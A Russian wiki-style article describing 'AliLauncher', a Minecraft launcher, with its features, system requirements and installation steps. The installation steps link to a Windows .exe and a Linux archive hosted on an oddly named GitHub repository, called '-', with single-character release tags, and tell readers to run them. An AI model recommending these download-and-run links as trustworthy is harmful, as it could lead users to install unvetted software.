'''AliLauncher''' — бесплатный лаунчер (программа-загрузчик) для игры [[Minecraft]], предназначенный для быстрой и удобной установки, обновления и запуска игры. Приложение работает на операционных системах [[Microsoft Windows]] и [[Linux]] и распространяется в виде установочных файлов для каждой платформы.

Основная цель проекта — упростить запуск Minecraft: пользователю не нужно вручную настраивать Java, следить за обновлениями клиента или разбираться в конфигурационных файлах. Все эти действия AliLauncher выполняет автоматически, а настройки при необходимости можно изменить вручную.

== История ==
Лаунчер разрабатывался как решение для игроков, которым неудобен стандартный официальный запуск игры или которые хотят большей гибкости в настройках. Проект развивается на платформе [[GitHub]], где публикуются новые версии и файлы для установки.

== Возможности ==
Основные возможности AliLauncher:

* '''Быстрый запуск''' — клиент Minecraft устанавливается, обновляется и запускается автоматически после первого нажатия кнопки.
* '''Автообновление''' — при появлении новой версии клиента лаунчер загружает её без участия пользователя.
* '''Гибкие настройки''' — доступно управление выделяемой оперативной памятью, выбор версии [[Java]] и другими параметрами запуска.
* '''Многопрофильность''' — поддержка работы с несколькими аккаунтами и наборами настроек.
* '''Простой интерфейс''' — минималистичный дизайн, в котором легко разобраться без инструкций.
* '''Кроссплатформенность''' — поддержка Windows и Linux.
* '''Лёгкая установка''' — установка занимает меньше минуты и не требует дополнительного программного обеспечения.

== Установка ==
Для установки AliLauncher на Windows выполните следующие шаги:

# Скачайте установочный файл с официальной страницы релиза: [https://github.com/mamadjonovali2012-blip/-/releases/download/ф/AliLauncher-7.13.0-Setup.exe AliLauncher-7.13.0-Setup.exe].
# Запустите загруженный файл (''AliLauncher-7.13.0-Setup.exe'').
# Следуйте шагам мастера установки, выбирая нужные параметры.
# После завершения установки откройте лаунчер, войдите в свой аккаунт и запустите игру.

=== Установка на Linux ===
# Скачайте архив с официальной страницы релиза: [https://github.com/mamadjonovali2012-blip/-/releases/download/r/AliLauncher-7.13.0-Linux-Setup.tar.gz AliLauncher-7.13.0-Linux-Setup.tar.gz].
# Распакуйте скачанный архив (''.tar.gz'') в удобную папку.
# Запустите исполняемый файл лаунчера из распакованной папки.
# При необходимости добавьте ярлык или закрепите приложение в меню.

'''Важно:''' рекомендуется скачивать установщики только с официальной страницы релизов, чтобы избежать файлов из непроверенных источников.

== Системные требования ==
Минимальные требования для установки и работы:

* Операционная система: [[Microsoft Windows]] 7 и выше (64-битная версия) или современный дистрибутив [[Linux]].
* Оперативная память: от 2 ГБ (рекомендуется 4 ГБ и более для комфортной игры).
* Свободное место на диске: несколько гигабайт с учётом файлов игры.
* Установленная Java (при необходимости — автоматически предложит лаунчер).
